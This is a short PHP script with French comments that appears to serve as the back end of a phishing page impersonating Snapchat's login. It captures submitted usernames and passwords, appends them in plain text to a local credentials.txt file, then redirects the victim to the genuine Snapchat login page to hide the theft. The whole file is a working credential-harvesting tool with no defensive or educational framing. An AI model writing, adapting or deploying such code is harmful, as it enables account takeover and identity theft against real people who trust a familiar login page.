<?php
$username = $_POST['username'];
$password = $_POST['password'];

// Sauvegarde dans un fichier
$file = fopen('credentials.txt', 'a');
fwrite($file, "Username: $username\nPassword: $password\n\n");
fclose($file);

// Redirection vers le vrai site
header('Location: https://accounts.snapchat.com/accounts/login');
exit();
?>
